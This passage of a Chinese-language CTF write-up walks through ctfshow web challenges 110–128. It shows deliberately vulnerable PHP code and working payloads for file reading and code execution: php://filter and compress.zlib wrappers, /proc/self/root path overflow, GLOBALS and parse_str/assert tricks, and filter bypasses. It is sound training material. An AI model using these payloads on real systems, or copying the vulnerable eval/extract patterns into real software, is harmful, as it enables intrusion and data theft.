single-quoted-string">'/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/'</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error v2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"echo new <span class="token interpolation"><span class="token variable">$v1</span></span>(<span class="token interpolation"><span class="token variable">$v2</span></span>());"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre><p>[The FilesystemIterator class](<a href="https://www.php.net/manual/zh/class.filesystemiterator.php">PHP: FilesystemIterator - Manual</a>)</p><p>php内置类 利用 FilesystemIterator 获取指定目录下的所有文件</p><p>Payload:<code>?v1=FilesystemIterator&amp;v2=getcwd</code></p><h4 id="web111-GLOBALS"><a href="#web111-GLOBALS" class="headerlink" title="web111(GLOBALS)"></a>web111(GLOBALS)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">getFlag</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token operator">&amp;</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$$v1</span></span> = &amp;<span class="token interpolation"><span class="token variable">$$v2</span></span>;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$$v1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\>/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error v1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\>/'</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error v2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ctfshow/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> </span></code></pre><p>注意 PHP 的函数具有词法作用域</p><p>在函数内部无法调用外部的变量，除非进行传参。这道题无非注意以下几点：</p><ol><li>我们最终要得到 $flag 的值，就需要 var_dump($$v1) 中的 $v1 为 flag，即 $v2 要为 flag，这样 $$v2 就为 $flag，&amp;$$v2 就为 $flag 对应的值</li><li>URL 传参时 $v2 不能直接传为 flag，否则 $flag 会因“函数内部无法调用外部变量”的限制而导致其返回 null</li><li>要想跨过词法作用域的限制，我们可以用 GLOBALS 常量数组，其中包含了 $flag 键值对，就可以将 $flag 的值赋给 $$v1</li></ol><p>Payload：<code>?v1=ctfshow&amp;v2=GLOBALS</code></p><h4 id="web112-is-file"><a href="#web112-is-file" class="headerlink" title="web112(is_file)"></a>web112(is_file)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\.\.\/|http|https|data|input|rot13|base64|string/i'</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </code></pre><p>要求传入的file不是文件，但还能highlight_file，这就要说明is_file和highlight_file对于文件的判断：is_file认为伪协议不是文件，highlight_file认为伪协议是文件，所以这里传入filter伪协议即可。</p><p>Payload:</p><blockquote><p>php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;flag.php<br>php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UCS-2LE.UCS-2BE&#x2F;resource&#x3D;flag.php<br>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.quoted-printable-encode&#x2F;resource&#x3D;flag.php<br>compress.zlib:&#x2F;&#x2F;flag.php</p></blockquote><p><a href="https://www.novel.tools/decode/UCS-2BE">UCS-2BE Text Decoder</a></p><h4 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/filter|\.\.\/|http|https|data|data|rot13|base64|string/i'</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>1.利用函数所能处理的长度限制进行目录溢出： 原理：&#x2F;proc&#x2F;self&#x2F;root代表根目录，进行目录溢出，超过is_file能处理的最大长度就不认为是个文件了。 payload: <code>file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/p roc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/pro c/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/ self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/se lf/root/proc/self/root/var/www/html/flag.php</code></p><p>2.利用php中zip伪协议 用法[源于php官方提供的一些例子]： compress.zlib:&#x2F;&#x2F;file.gz compress.zlib:&#x2F;&#x2F;file.bz2 payload: <code>file=compress.zlib://flag.php</code></p><h4 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i'</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"师傅们居然tql都是非预期 哼！"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>把filter放出来了，直接读</p><h4 id="web115-f绕过is-numberic-trim"><a href="#web115-f绕过is-numberic-trim" class="headerlink" title="web115(\f绕过is_numberic()+trim())"></a>web115(\f绕过is_numberic()+trim())</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0x"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"e"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"+"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$num</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$num</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token variable">$num</span><span class="token operator">!==</span><span class="token string single-quoted-string">'36'</span> <span class="token keyword">and</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token string single-quoted-string">'36'</span> <span class="token keyword">and</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string single-quoted-string">'36'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">==</span><span class="token string single-quoted-string">'36'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker!!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker!!!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><strong>trim()</strong> 函数移除字符串两侧的空白字符或其他预定义字符。</p><p>一般是用来去除字符串首尾处的空白字符（或者其他字符），一般在用在服务端对接收的用户数据进行处理，以免把用户误输入的空格存储到数据库，下次对比数据时候出错。</p><p>filter让我们没法转进制绕过，这道题的关键在于如何绕过trim，推测需要特殊字符，所以我们写个脚本fuzz一下：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0x"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"e"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"+"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$num</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token number">129</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'36'</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token variable">$num</span><span class="token operator">!==</span><span class="token string single-quoted-string">'36'</span> <span class="token keyword">and</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token string single-quoted-string">'36'</span> <span class="token keyword">and</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string single-quoted-string">'36'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span></span></code></pre><p>Payload:<code>?num=%0c36</code></p><p>trim函数会过滤空格以及<code>\n\r\t\v\0</code>，但不会过滤<code>\f</code></p><h4 id="web123-下划线-绕过"><a href="#web123-下划线-绕过" class="headerlink" title="web123(下划线_绕过)"></a>web123(下划线_绕过)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'argv'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fun'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CTF_SHOW'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CTF_SHOW.COM'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fl0g'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\"|\'|\,|\.|\;|\?/"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token variable">$c</span><span class="token operator">&lt;=</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$c</span></span>"</span><span class="token operator">.</span><span class="token string double-quoted-string">";"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$fl0g</span><span class="token operator">===</span><span class="token string double-quoted-string">"flag_give_me"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>             <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> </code></pre><p>在php中变量名只有数字字母下划线，被get或者post传入的变量名，如果含有空格、+、[则会被转化为<code>_</code>，所以按理来说我们构造不出CTF_SHOW.COM这个变量(因为含有.)，但php中有个特性就是如果传入[，它被转化为<code>_</code>之后，后面的字符就会被保留下来不会被替换</p><p>Payload:<code>CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=echo $flag</code></p><h4 id="web125-SERVER-‘argv’-绕过"><a href="#web125-SERVER-‘argv’-绕过" class="headerlink" title="web125($_SERVER[‘argv’]绕过)"></a>web125($_SERVER[‘argv’]绕过)</h4><p>利用$_SERVER[‘argv’]</p><blockquote><p>parse_str(）函数把查询字符串解析到变量中。<br>注释：如果未设置array参数，则由该函数设置的变量将覆盖已存在的同名变量。<br>注释：php.ini 文件中的 magic_quotes_gpc 设置影响该函数的输出。如果已启用，那么在 parse_strO）解析之前，变量会被 addslashesO转换。</p></blockquote><p>$_SERVER 是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。这个数组中的项目由 Web 服务器创建。</p><p>‘argv’</p><p>传递给该脚本的参数的数组。当脚本以命令行方式运行时，argv 变量传递给程序 C 语言样式的命令行参数。当通过 GET 方式调用时，该变量包含query string。</p><p>意思就是通过$_SERVER[‘argv’]将$a变成数组，再利用数组的性质将fl0g&#x3D;flag_give_me传入，同时还绕过第一个if中的!isset($_GET[‘fl0g’]))，用+来进行分隔，使得数组中有多个数值。</p><p>执行eval函数也就是执行$c即是parse_str($a[1])，使得fl0g&#x3D;flag_give_me，从而进入第三个if语句。</p><p>Payload:</p><blockquote><p>GET:?1&#x3D;flag.php </p><p>POST:CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;highlight_file($_GET[1])</p><p>GET:?a&#x3D;1++fl0g&#x3D;flag_give_me</p><p>POST:CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;parse_str($a[1])</p><p>GET:?a&#x3D;1++fl0g&#x3D;flag_give_me</p><p>POST:CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;assert($a[0])</p></blockquote><h4 id="web126"><a href="#web126" class="headerlink" title="web126"></a>web126</h4><p>Payload同上</p><h4 id="web127-extract变量覆盖-SERVER-‘QUERY-STRING’"><a href="#web127-extract变量覆盖-SERVER-‘QUERY-STRING’" class="headerlink" title="web127(extract变量覆盖 $_SERVER[‘QUERY_STRING’])"></a>web127(extract变量覆盖 $_SERVER[‘QUERY_STRING’])</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ctf_show</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//特殊字符检测</span><span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\'|\"|\&lt;|\,|\>|\.|\\\|\//'</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"嗯哼？"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ctf_show</span><span class="token operator">===</span><span class="token string single-quoted-string">'ilove36d'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p><strong>extract()</strong> 函数从数组中将变量导入到当前的符号表。</p><p><code>.</code>和<code>[</code>被过滤了可以使用<code> </code>(空格)来过滤</p><p>**$SERVER[‘QUERY_STRING’];**获取的查询语句是服务端还没url解码之前的字符串，所以对<code>_</code>进行一次url编码也能绕过。</p><p>Payload:<code>?ctf%5fshow=ilove36d</code></p><h4 id="web128-gettext"><a href="#web128-gettext" class="headerlink" title="web128(gettext-&gt;_())"></a>web128(gettext-&gt;_())</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$f1</span> <span class="token operator">=</span> <span class="token 